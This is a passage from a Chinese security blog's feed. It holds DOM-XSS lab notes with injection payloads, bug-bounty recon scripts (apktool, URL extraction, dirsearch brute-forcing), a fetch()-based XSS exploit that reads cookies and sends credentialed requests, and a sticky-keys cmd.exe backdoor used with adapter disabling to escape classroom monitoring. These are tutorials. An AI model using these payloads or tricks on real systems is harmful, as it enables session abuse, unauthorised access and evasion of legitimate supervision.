//判断URL是否为空</span><br><span class="line">                 var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">                 url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">                 &#125;else&#123;</span><br><span class="line">                   url=&quot;url参数为空&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">           &lt;/script&gt;</span><br><span class="line">         &lt;/head&gt;</span><br><span class="line">         &lt;body&gt;</span><br><span class="line">           &lt;textarea id=&quot;test&quot; rows=&quot;8&quot; cols=&quot;40&quot;&gt;2s获取url&lt;/textarea&gt;</span><br><span class="line">           &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">              function showURL(url)&#123;</span><br><span class="line">                document.getElementById(&apos;test&apos;).value=url;</span><br><span class="line">              &#125;</span><br><span class="line">              if(url!=&quot;url参数为空&quot;)</span><br><span class="line">              setTimeout(&quot;showURL(&apos;&quot;+url+&quot;&apos;)&quot;,2000);</span><br><span class="line">                   //setInterval(&quot;showURL(&apos;&quot;+url+&quot;&apos;)&quot;,3000);</span><br><span class="line">           &lt;/script&gt;</span><br><span class="line">         &lt;/body&gt;</span><br><span class="line">       &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.html?url=aa&apos;);alert(&apos;xsstest&apos;);eval(&apos;</span><br></pre></td></tr></table></figure><p>setTimeout变成</p><p>setTimeout(“showURL(‘“‘);alert(‘xsstest’);eval(‘+url+”‘)”,2000);</p><p>火狐下会自动对参数传输进行url编码</p><p>导致xss失败</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出为aa%27);alert(%27xsstest%27);eval(%27</span><br></pre></td></tr></table></figure><p>edge下有效</p><h3 id="dom-xss实例"><a href="#dom-xss实例" class="headerlink" title="dom-xss实例"></a>dom-xss实例</h3><p>色块XSS</p><p>test.htm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">varname = location.search.substr(1);</span><br><span class="line">var varnames = varname.split(&apos;|&apos;);</span><br><span class="line">varname = varnames[0];</span><br><span class="line">varnamev = varnames[1];</span><br><span class="line">fun = varnames[2] || &apos;&apos;;</span><br><span class="line">var colors = &apos;\</span><br><span class="line">000000#000000#000033#000066#000099#0000CC#0000FF#003300#003333#003366#003399#0033CC#0033FF#006600#006633#006666#006699#0066CC#0066FF#\</span><br><span class="line">333333#009900#009933#009966#009999#0099CC#0099FF#00CC00#00CC33#00CC66#00CC99#00CCCC#00CCFF#00FF00#00FF33#00FF66#00FF99#00FFCC#00FFFF#\</span><br><span class="line">666666#330000#330033#330066#330099#3300CC#3300FF#333300#333333#333366#333399#3333CC#3333FF#336600#336633#336666#336699#3366CC#3366FF#\</span><br><span class="line">999999#339900#339933#339966#339999#3399CC#3399FF#33CC00#33CC33#33CC66#33CC99#33CCCC#33CCFF#33FF00#33FF33#33FF66#33FF99#33FFCC#33FFFF#\</span><br><span class="line">CCCCCC#660000#660033#660066#660099#6600CC#6600FF#663300#663333#663366#663399#6633CC#6633FF#666600#666633#666666#666699#6666CC#6666FF#\</span><br><span class="line">FFFFFF#669900#669933#669966#669999#6699CC#6699FF#66CC00#66CC33#66CC66#66CC99#66CCCC#66CCFF#66FF00#66FF33#66FF66#66FF99#66FFCC#66FFFF#\</span><br><span class="line">FF0000#990000#990033#990066#990099#9900CC#9900FF#993300#993333#993366#993399#9933CC#9933FF#996600#996633#996666#996699#9966CC#9966FF#\</span><br><span class="line">00FF00#999900#999933#999966#999999#9999CC#9999FF#99CC00#99CC33#99CC66#99CC99#99CCCC#99CCFF#99FF00#99FF33#99FF66#99FF99#99FFCC#99FFFF#\</span><br><span class="line">0000FF#CC0000#CC0033#CC0066#CC0099#CC00CC#CC00FF#CC3300#CC3333#CC3366#CC3399#CC33CC#CC33FF#CC6600#CC6633#CC6666#CC6699#CC66CC#CC66FF#\</span><br><span class="line">FFFF00#CC9900#CC9933#CC9966#CC9999#CC99CC#CC99FF#CCCC00#CCCC33#CCCC66#CCCC99#CCCCCC#CCCCFF#CCFF00#CCFF33#CCFF66#CCFF99#CCFFCC#CCFFFF#\</span><br><span class="line">00FFFF#FF0000#FF0033#FF0066#FF0099#FF00CC#FF00FF#FF3300#FF3333#FF3366#FF3399#FF33CC#FF33FF#FF6600#FF6633#FF6666#FF6699#FF66CC#FF66FF#\</span><br><span class="line">FF00FF#FF9900#FF9933#FF9966#FF9999#FF99CC#FF99FF#FFCC00#FFCC33#FFCC66#FFCC99#FFCCCC#FFCCFF#FFFF00#FFFF33#FFFF66#FFFF99#FFFFCC#FFFFFF&apos;;</span><br><span class="line">var colorarray = colors.split(&apos;#&apos;);</span><br><span class="line">var setv = &apos;&apos;;</span><br><span class="line">function showcolors() &#123;</span><br><span class="line">var s = &apos;&apos;;</span><br><span class="line">for(c in colorarray) &#123;</span><br><span class="line">s += &apos;&lt;em onmouseover=&quot;v(\&apos;&apos; + colorarray[c] + &apos;\&apos;)&quot; style=&quot;background-color:#&apos; + colorarray[c] + &apos;&quot;&gt;&lt;/em&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&apos;colors&apos;).innerHTML = s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setvalue(obj) &#123;</span><br><span class="line">if(varname) &#123;</span><br><span class="line">parent.$(varname).style.backgroundColor = setv;</span><br><span class="line">&#125;</span><br><span class="line">if(varnamev) &#123;</span><br><span class="line">parent.$(varnamev).value = setv;</span><br><span class="line">&#125;</span><br><span class="line">if(fun) eval(&apos;parent.&apos;+fun+&apos;(&quot;&apos;+setv+&apos;&quot;)&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function v(v) &#123;</span><br><span class="line">v = v != &apos;transparent&apos; ? &apos;#&apos; + v : &apos;transparent&apos;;</span><br><span class="line">document.getElementById(&apos;p&apos;).style.backgroundColor = v;</span><br><span class="line">setv = v;</span><br><span class="line">document.getElementById(&apos;pv&apos;).innerHTML = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123; margin:0px;background-color:#333; &#125;</span><br><span class="line">#h &#123; padding:0;width:210px;height:15px;background-color:#CCC;overflow:hidden;&#125;</span><br><span class="line">#p &#123; margin:0;display:block;float:left;font-size:0;width:140px;height:13px;background:#DDF0DF; &#125;</span><br><span class="line">#pv &#123; margin:0;display:block;float:left;font-size:12px;width:58px;height:13px;overflow:hidden;text-align: right;font-style:normal;background:#DDF0DF; &#125;</span><br><span class="line">#colors &#123; clear:both;width:209px; height:133px; &#125;</span><br><span class="line">#colors em, .trans &#123; font-size:0;margin:1px 0 0 1px;width:10px;height:10px;float:left;cursor:pointer; &#125;</span><br><span class="line">.trans &#123; background-color: #FFF; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onmousedown=&quot;setvalue(document.getElementById(&apos;colorhex&apos;))&quot; scrolling=&quot;no&quot;&gt;</span><br><span class="line">&lt;div id=&quot;h&quot;&gt;&lt;em id=&quot;p&quot;&gt;&lt;/em&gt;&lt;em id=&quot;pv&quot;&gt;&lt;/em&gt;&lt;em class=&quot;trans&quot; onmouseover=&quot;v(&apos;transparent&apos;)&quot; style=&quot;background-image:url(&apos;transcolor.gif&apos;)&quot;&gt;&lt;/em&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;colors&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">showcolors();</span><br><span class="line">try &#123;document.getElementById(&apos;box&apos;).style.backgroundColor = cvalue;&#125; catch(e) &#123;&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.htm?||alert(/xss/)</span><br></pre></td></tr></table></figure><p>这里是由于fun变量没有过滤导致的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun = varnames[2] || &apos;&apos;;       这里fun等于alert(/xss/)</span><br></pre></td></tr></table></figure><p>eval函数执行  parent.alert(/xss/) 触发xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(fun) eval(&apos;parent.&apos;+fun+&apos;(&quot;&apos;+setv+&apos;&quot;)&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>somepayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);alert(1);//</span><br></pre></td></tr></table></figure><h2 id="一些乌云上的XSS案例"><a href="#一些乌云上的XSS案例" class="headerlink" title="一些乌云上的XSS案例"></a>一些乌云上的XSS案例</h2><p>搜狐邮箱储存型XSS <a href="https://shuimugan.com/bug/view?bug_no=167250" target="_blank" rel="noopener">https://shuimugan.com/bug/view?bug_no=167250</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="笔记" scheme="https://legoc.github.io/categories/笔记/"/>
    
    
    <category term="XSS" scheme="https://legoc.github.io/tags/XSS/"/>
    
    <category term="靶场学习" scheme="https://legoc.github.io/tags/靶场学习/"/>
    
    <category term="dom-xss" scheme="https://legoc.github.io/tags/dom-xss/"/>
    
  </entry>
  
  <entry>
    <title>关于SRC挖掘的一点小脚本</title>
    <link href="https://legoc.github.io/2019/01/26/%E5%85%B3%E4%BA%8ESRC%E6%8C%96%E6%8E%98%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    <id>https://legoc.github.io/2019/01/26/%E5%85%B3%E4%BA%8ESRC%E6%8C%96%E6%8E%98%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8F%E8%84%9A%E6%9C%AC/</id>
    <published>2019-01-26T12:13:13.000Z</published>
    <updated>2019-01-26T12:59:13.667Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a>安卓逆向</h2><p>大佬们怼网站已经怼的很凶了，实在无从下手的时候，可以从app上测测，除了平时的APP抓包，我们还可以逆向app从而找到一些没人怼过api或者服务器。</p><p>首先关于app的逆向方面，我推荐两个工具</p><p>apktools和Android逆向助手</p><p>我们之间用apktools逆向app即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app-release.apk</span><br></pre></td></tr></table></figure><p>在逆向之后会发现文件夹里有smali_classes文件夹，这里存放了一些后缀为.smali文件，</p><p>在这里可以找到一些url，但是由于内容太多，一个个点开很麻烦，我写了个小python脚本，把里面的url提取出来</p><p>！！不过注意我这个脚本跑的挺慢的，例如smali_classes1 smali_classes2，脚本放在这种里面的文件夹内，不然要跑多久我也不知道！！</p><p>get_url.py       python2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">result = []</span><br><span class="line">def get_all(cwd):</span><br><span class="line">    global text</span><br><span class="line">    get_dir = os.listdir(cwd)  #遍历当前目录，获取文件列表</span><br><span class="line">    for i in get_dir:          </span><br><span class="line">        sub_dir = os.path.join(cwd,i)  # 把第一步获取的文件加入路径</span><br><span class="line">        if os.path.isdir(sub_dir):     #如果当前仍然是文件夹，递归调用</span><br><span class="line">            get_all(sub_dir)</span><br><span class="line">        else:</span><br><span class="line">            ax = os.path.basename(sub_dir)  #如果当前路径不是文件夹，则把文件名放入列表</span><br><span class="line">            result.append(ax)          </span><br><span class="line">            #打开文件叠加读取</span><br><span class="line">            f=open(sub_dir,&quot;r&quot;)</span><br><span class="line">            text=text+f.read()</span><br><span class="line">def write_url():</span><br><span class="line">    pattern = re.compile(r&apos;http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&apos;)</span><br><span class="line">    url = re.findall(pattern,text)</span><br><span class="line">    f2 = open(&quot;url.txt&quot;,&quot;w+&quot;)</span><br><span class="line">    f2.writelines([line+&apos;\n&apos; for line in url])</span><br><span class="line">if __name__ == &quot;__main__&quot;: </span><br><span class="line">    cur_path = os.getcwd()   #当前目录</span><br><span class="line">    text=&quot;&quot;</span><br><span class="line">    get_all(cur_path)</span><br><span class="line">    write_url()</span><br></pre></td></tr></table></figure><p>然后会得到一个都是url的文件，对其测试或许可以找到一些漏洞</p><p><img src="/2019/01/26/关于SRC挖掘的一点小脚本/1.jpg" alt=""></p><p>当然在这里测的时候，找到了一些api访问要带参数，关于参数可以用一款叫Android逆向助手，先点击提取dex然后再dex转jar</p><p>然后ctrl+shift+s就可以全局搜索url，然后读他源码来看看需要传入什么参数</p><p><img src="/2019/01/26/关于SRC挖掘的一点小脚本/2.jpg" alt=""></p><h2 id="关于目录爆破的一点小脚本"><a href="#关于目录爆破的一点小脚本" class="headerlink" title="关于目录爆破的一点小脚本"></a>关于目录爆破的一点小脚本</h2><p>在查找到一些子域名之后，不妨之间爆破一些他的目录，有时候可能会有意外发现</p><p>我会在我的服务器上运行一个小shell脚本来对这些子域名进行目录扫描，我用的是dirsearch <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>dir.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for line in `cat url`</span><br><span class="line">do</span><br><span class="line">    timeout 300s python3 dirsearch.py -u $line -e *</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>目录下有url这个文件，他存放着一些我们的url,可以是平时的子域名，也可以是上面的逆向出来的一些url,dirsearch一般不用太长时间就可以跑完，扫崩了的情况可以用timeout来限制他跑一次的时间，这样就不怕卡死了。</p><p>dirsearch扫描结果在reports文件夹下，可以切换进去</p><p>然后用个类似上面的脚本来把这些扫描结果整合在一起</p><p>reports.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import os</span><br><span class="line">result = []</span><br><span class="line">def get_all(cwd):</span><br><span class="line">    global text</span><br><span class="line">    get_dir = os.listdir(cwd)  #遍历当前目录，获取文件列表</span><br><span class="line">    for i in get_dir:</span><br><span class="line">        sub_dir = os.path.join(cwd,i)  # 把第一步获取的文件加入路径</span><br><span class="line">        if os.path.isdir(sub_dir):     #如果当前仍然是文件夹，递归调用</span><br><span class="line">            get_all(sub_dir)</span><br><span class="line">        else:</span><br><span class="line">            ax = os.path.basename(sub_dir)  #如果当前路径不是文件夹，则把文件名放入列表</span><br><span class="line">            result.append(ax)</span><br><span class="line">            #打开文件叠加读取</span><br><span class="line">            f=open(sub_dir,&quot;r&quot;)</span><br><span class="line">            text=text+f.read()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    cur_path = os.getcwd()   #当前目录</span><br><span class="line">    text=&quot;&quot;</span><br><span class="line">    get_all(cur_path)</span><br><span class="line">    rs=open(&quot;rs.txt&quot;,&quot;w+&quot;)</span><br><span class="line">    rs.write(text)</span><br></pre></td></tr></table></figure><p>然后得到扫描结果rs,txt 这样就可以直接查看所有扫描结果了</p><p>小弟不才，不会太多自动化的东西，只能用点小脚本来代替重复劳动，第一次发帖，大佬们多多包涵。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="SRC" scheme="https://legoc.github.io/categories/SRC/"/>
    
    
    <category term="SRC挖掘" scheme="https://legoc.github.io/tags/SRC挖掘/"/>
    
    <category term="小技巧" scheme="https://legoc.github.io/tags/小技巧/"/>
    
  </entry>
  
  <entry>
    <title>xss利用之fetch</title>
    <link href="https://legoc.github.io/2019/01/26/xss%E5%88%A9%E7%94%A8%E4%B9%8Bfetch/"/>
    <id>https://legoc.github.io/2019/01/26/xss%E5%88%A9%E7%94%A8%E4%B9%8Bfetch/</id>
    <published>2019-01-26T03:54:47.000Z</published>
    <updated>2019-01-26T05:26:29.848Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>偶然间发现某站有个漏洞</p><p>因为有WAF不好利用，我之前是不知道能咋利用，</p><p>然后大佬说能XSS利用，叫我写个fetch利用，</p><p>我？？？？？</p><p>试着去学fetch这个东西了</p><p>于是有了此文</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先看看说明文档那个样子 <a href="https://segmentfault.com/a/1190000007019545" target="_blank" rel="noopener">https://segmentfault.com/a/1190000007019545</a></p><p>大致理解了</p><p>然后发出一个fetch的post请求</p><p>也就是这个样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fetch(&quot;http://192.168.199.141:3000/api/user/&quot;,&#123;</span><br><span class="line">  method:&apos;POST&apos;,</span><br><span class="line">  headers:&#123;</span><br><span class="line">     &apos;Content-Type&apos;: &apos;application/json&apos;</span><br><span class="line">  &#125;,</span><br><span class="line">  body:JSON.stringify(&#123;</span><br><span class="line">    name:&apos;john&apos;,</span><br><span class="line">    pass:&apos;xioayuan&apos;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then((response)=&gt;response.json())</span><br><span class="line">.then((responseJsonData)=&gt;&#123;</span><br><span class="line">  alert(&quot;请求成功&quot;);</span><br><span class="line">  console.log(responseJsonData);</span><br><span class="line">&#125;)</span><br><span class="line">.catch((error)=&gt;&#123;</span><br><span class="line">  alert(error);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>如果XSS点能利用，就在这里发送一个fetch请求，来作为利用点</p><p>假如利用点要用到cookie里面的某些值，我们可以用js来提取cookie里的特定段值，可以写个正则提取比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie.replace(/(?:(?:^|.*;\s*)key\s*\=\s*([^;]*).*$)|^.*$/, &apos;$1&apos;)</span><br></pre></td></tr></table></figure><p>这样就能提取到key的值了</p><p>上面的body是一个json类型，如果是一般类型的我们可以直接写一个这样的JS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var form = &apos;xxxxxx&apos;+document.cookie.replace(/(?:(?:^|.*;\s*)key\s*\=\s*([^;]*).*$)|^.*$/, &apos;$1&apos;);</span><br><span class="line">fetch(&apos;https://api.xxxx.com/add&apos;, &#123;</span><br><span class="line">method: &quot;POST&quot;,</span><br><span class="line">mode: &quot;cors&quot;,</span><br><span class="line">credentials: &apos;include&apos;,</span><br><span class="line">headers: &#123;</span><br><span class="line">&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">&#125;,</span><br><span class="line">body: form</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>直接在url里面构造就行了，然后把链接去生成一个短链接，就算完成了。</p><p>这样一个反射XSS的利用还是蛮有意思的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/categories/渗透测试/"/>
    
    
    <category term="XSS" scheme="https://legoc.github.io/tags/XSS/"/>
    
    <category term="前端黑客" scheme="https://legoc.github.io/tags/前端黑客/"/>
    
  </entry>
  
  <entry>
    <title>那抹忧伤始终无法释怀</title>
    <link href="https://legoc.github.io/2018/12/28/%E9%82%A3%E6%8A%B9%E5%BF%A7%E4%BC%A4%E5%A7%8B%E7%BB%88%E6%97%A0%E6%B3%95%E9%87%8A%E6%80%80/"/>
    <id>https://legoc.github.io/2018/12/28/%E9%82%A3%E6%8A%B9%E5%BF%A7%E4%BC%A4%E5%A7%8B%E7%BB%88%E6%97%A0%E6%B3%95%E9%87%8A%E6%80%80/</id>
    <published>2018-12-28T09:26:05.000Z</published>
    <updated>2019-01-21T05:00:58.528Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="请输入密码查看" />    <label for="pass">请输入密码查看</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">文章已被加密</summary>
    
    
    
    <category term="随笔" scheme="https://legoc.github.io/categories/随笔/"/>
    
    
    <category term="人生杂谈" scheme="https://legoc.github.io/tags/人生杂谈/"/>
    
    <category term="伤感" scheme="https://legoc.github.io/tags/伤感/"/>
    
    <category term="失去" scheme="https://legoc.github.io/tags/失去/"/>
    
  </entry>
  
  <entry>
    <title>巧用粘滞键-随时脱离与连接教师机</title>
    <link href="https://legoc.github.io/2018/11/15/%E5%B7%A7%E7%94%A8%E7%B2%98%E6%BB%9E%E9%94%AE-%E9%9A%8F%E6%97%B6%E8%84%B1%E7%A6%BB%E4%B8%8E%E8%BF%9E%E6%8E%A5%E6%95%99%E5%B8%88%E6%9C%BA/"/>
    <id>https://legoc.github.io/2018/11/15/%E5%B7%A7%E7%94%A8%E7%B2%98%E6%BB%9E%E9%94%AE-%E9%9A%8F%E6%97%B6%E8%84%B1%E7%A6%BB%E4%B8%8E%E8%BF%9E%E6%8E%A5%E6%95%99%E5%B8%88%E6%9C%BA/</id>
    <published>2018-11-15T04:08:44.000Z</published>
    <updated>2018-11-20T00:54:35.282Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="粘滞键"><a href="#粘滞键" class="headerlink" title="粘滞键"></a>粘滞键</h2><p>粘滞键也就是我们多次按下shift的时候跳出来的那个框</p><p>对应在文件在C:/Windows/System32/sethc.exe</p><p>我们把cmd.exe改成sethc.exe 即多次按shift可调出dos命令行</p><p>由于setch的用户组是TrustedInstaller即使我们是管理员权限也无法修改他</p><p>我们可以右键-安全-更改用户组</p><p>改成管理员的用户组然后给他一个修改的权限</p><p>改个名字，然后把cmd.exe复制一下改成sethc.exe</p><p>然后我们按多次shift就可以调用出dos命令了</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>机房的网络是局域网</p><p>教师机与我们相连是在局域网内控制我们的，我们设置成自动获取ip之后，老师控制不了我们是因为处于不同的局域网内了。</p><p>所以只要我们把网卡禁用了，老师一样控制不了我们。</p><p>在上面我们能把粘滞键改成dos命令了</p><p>在被控制时，我们只要按下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTRL+ALT+.</span><br></pre></td></tr></table></figure><p>在多次按shift即可调出DOS命令行</p><p>禁用网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface set interface &quot;本地连接&quot; disabled</span><br></pre></td></tr></table></figure><p>启用网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface set interface &quot;本地连接&quot; enabled</span><br></pre></td></tr></table></figure><p>我们也可以把这些做成一个批处理文件</p><p>直接在dos里面运行批处理即可</p><p>禁用网卡可脱离控制</p><p>启用网卡可连接上控制</p><p>这样我们就可以随时连接与脱离教师机的控制了</p><h2 id="演示视频"><a href="#演示视频" class="headerlink" title="演示视频"></a>演示视频</h2><iframe src="//player.bilibili.com/player.html?aid=36208466&cid=63564155&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="笔记" scheme="https://legoc.github.io/categories/笔记/"/>
    
    
    <category term="黑阔" scheme="https://legoc.github.io/tags/黑阔/"/>
    
    <category term="骚操作" scheme="https://legoc.github.io/tags/骚操作/"/>
    
  </entry>
  
  <entry>
    <title>读乌云漏洞库</title>
    <link href="https://legoc.github.io/2018/11/06/%E8%AF%BB%E4%B9%8C%E4%BA%91%E6%BC%8F%E6%B4%9E%E5%BA%93/"/>
    <id>https://legoc.github.io/2018/11/06/%E8%AF%BB%E4%B9%8C%E4%BA%91%E6%BC%8F%E6%B4%9E%E5%BA%93/</id>
    <published>2018-11-06T14:44:17.000Z</published>
    <updated>2019-03-30T03:05:39.308Z</updated>
    
